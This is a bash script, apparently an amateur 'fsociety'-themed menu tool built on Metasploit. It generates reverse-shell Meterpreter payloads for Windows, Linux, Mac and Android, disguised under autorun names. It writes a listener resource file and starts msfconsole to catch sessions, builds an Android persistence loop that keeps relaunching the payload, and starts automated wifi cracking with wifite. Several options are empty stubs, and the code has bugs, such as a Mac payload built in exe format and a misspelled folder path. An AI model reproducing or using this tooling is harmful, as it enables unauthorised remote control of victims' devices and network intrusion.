#!/bin/bash
# start coding
# etc
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[[ $(id -u) -eq 0 ]] || { echo -e "Must be root user to run the script"; exit 1; }
resize -s 30 60
clear
SERVICE=service

if ps ax | grep -v grep | grep metasploit > /dev/null
then 
    echo "$SERVICE service starting"
else 
    echo "$SERVICE service not started, try again"
fi
mkdir -p "$HOME/Desktop/fsociety"
clear
echo -e "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo -e "@@@@@@@@@@@@@@@@@@@@@@@@@metasploit service started@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo -e "@@@@@@@@@@@@@@@@@@@@ script and payload save to $HOME/Desktop/fsociety@@@@@@@@"
echo -e "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo -n "Press {enter key} to start........."
clear
echo -e "@@@@@@@@ Metasploit make an automatically hacking script@@@@@@@@"
echo -e
figlet msfdb

# Banner
tput sgr0
echo -e "@@@@@@@@@@@@@@@@@@@@@ Select an option below @@@@@@@@@@@@@@@@@@@"
echo -e "################################################################"
echo -e ">>>>>>>>>>>>>>>>>>>>>> {1} Create a payload <<<<<<<<<<<<<<<<<<<"
tput sgr0
echo -e ">>>>>>>>>>>>>>>>>>>>>>{2} Start a Multi-Handler <<<<<<<<<<<<<<"
tput sgr0
echo -e ">>>>>>>>>>>>>>>>>>>>>>{3} Use Exploit msfconsole <<<<<<<<<<<<<<"
tput sgr0
echo -e ">>>>>>>>>>>>>>>>>>>>>>{4} Use Persistence <<<<<<<<<<<<<<"
tput sgr0
echo -e ">>>>>>{5} wifite with automatically wifi hacking <<<<<<<<<<<<<"
tput sgr0
echo -e ">>>>>>>>>>>>>>>>>>>>>>{6} description<<<<<<<<<<<<<<<<<<<<<<<<<<"
tput sgr0
echo -e"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo -e "################################################################"
tput sgr0
read -p "Enter your choice (6 to Quit): " options

case "$options" in  
    "1")
        # Payload Creation
        echo -e "Let's start creating the payload"
        PS3='Enter your choice (6 to Quit): '
        options=("windows" "linux" "Mac" "android" "list_all" "quit")
        select opt in "${options[@]}"; do
            case $opt in
                "windows")
                    read -p 'Set LHOST IP: ' ip
                    read -p 'Set LPORT: ' port
                    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > "$HOME/Desktop/fsociety/autorun.exe"
                    echo -e "Metasploit shell saved to $HOME/Desktop/fsociety"
                    ;;
                "linux")
                    read -p 'Set LHOST IP: ' ip
                    read -p 'Set LPORT: ' port
                    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > "$HOME/Desktop/fsociety/autorun.elf"
                    echo -e "Metasploit shell saved to $HOME/Desktop/fsociety"
                    ;;
                "Mac")
                    read -p 'Set LHOST IP: ' ip
                    read -p 'Set LPORT: ' port
                    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > "$HOME/Desktop/fsociety/autorun.macho"
                    echo -e "Metasploit shell saved to $HOME/Desktop/fsociety"
                    ;;
                "android")
                    read -p 'Set LHOST IP: ' ip
                    read -p 'Set LPORT: ' port
                    msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port > "$HOME/Desktop/fsociety/autorun.apk"
                    echo -e "Metasploit autorun.apk saved to $HOME/Desktop/fsociety"
                    ;;
                "list_all")
                    xterm -e msfvenom -l &
                    ;;
                "quit")
                    echo "See ya" && break
                    ;;
                *)
                    echo "Invalid option, please try again"
                    ;;
            esac
        done
        ;;
    "2")
        # Multi-Handler
        echo -e "Let's create a listener"
        PS3='Enter your choice (6 to Quit): '
        options=("windows" "linux" "Mac" "android" "list_all" "quit")
        select opt in "${options[@]}"; do
            case $opt in
                "windows")
                    touch "$HOME/Desktop/fsociety/meterpreter.rc"
                    echo use exploit/multi/handler > "$HOME/Desktop/fsociety/meterpreter.rc"
                    echo set PAYLOAD windows/meterpreter/reverse_tcp >> "$HOME/Desktop/fsociety/meterpreter.rc"
                    read -p 'Set LHOST IP: ' ip
                    echo set LHOST $ip >> "$HOME/Desktop/fsociety/meterpreter.rc"
                    read -p 'Set LPORT: ' port
                    echo set LPORT $port >> "$HOME/Desktop/fsociety/meterpreter.rc"
                    echo set ExitonSession false >> "$HOME/Desktop/fsociety/meterpreter.rc"
                    echo exploit -j -z >> "$HOME/Desktop/fsociety/meterpreter.rc"
                    cat "$HOME/Desktop/fsociety/meterpreter.rc"
                    xterm -e msfconsole -r "$HOME/Desktop/fsociety/meterpreter.rc" &
                    exit
                    ;;
                "linux")
                    # Repeat the same logic for Linux
                    ;;
                "Mac")
                    # Repeat the same logic for Mac
                    ;;
                "android")
                    # Repeat the same logic for Android
                    ;;
                "list_all")
                    # Logic for listing all payloads
                    ;;
                "quit")
                    echo "See ya" && break
                    ;;
                *)
                    echo "Invalid option, please try again"
                    ;;
            esac
        done
        ;;
    "3")
        # Exploit msfconsole
        echo -e "Exploit msfconsole option selected"
        ;;
    "4")
        # Persistence
        echo -e "Create Persistence"
        PS3='Enter your choice (6 to Quit): '
        options=("windows" "linux" "Mac" "android" "quit")
        select opt in "${options[@]}"; do
            case $opt in
                "windows")
                    read -p 'Set LHOST IP: ' ip
                    read -p 'Set LPORT: ' port
                    echo -e "Creating persistence for Windows..."
                    ;;
                "linux")
                    echo -e "Creating persistence for Linux..."
                    ;;
                "Mac")
                    echo -e "Creating persistence for Mac..."
                    ;;
                "android")
                    touch ~/Desktop/Fsoicety/android.sh 
                    echo #!/bin/bash >> ~/Desktop/Fsoicety/android.sh 
                    echo while : >>  ~/Desktop/Fsoicety/android.sh 
                    echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/Desktop/Fsoicety/android.sh 
                    echo sleep 20  >> ~/Desktop/Fsoicety/android.sh 
                    echo done >> ~/Desktop/Fsoicety/android.sh 
                    cat  ~/Desktop/Fsoicety/android.sh
                    echo -e "android.sh saved to  ~/Desktop/Fsoicety. Upload it to the device."
                    ;;
                "quit")
                    echo "See ya!" && break
                    ;;
                *)
                    echo "Invalid option, please try again"
                    ;;
            esac
        done
        ;;
    "5" | "5")
        # Wifite auto wifi hacking
        echo -e "Auto wifi hacking..."
        xterm -e sudo wifite
        ;;
    "6")
        # Description
        echo -e "This is a metasploit-based tool for creating payloads, starting multi-handlers, and automating wifi hacking."
        ;;
    *)
        echo "Invalid option"
        ;;
esac
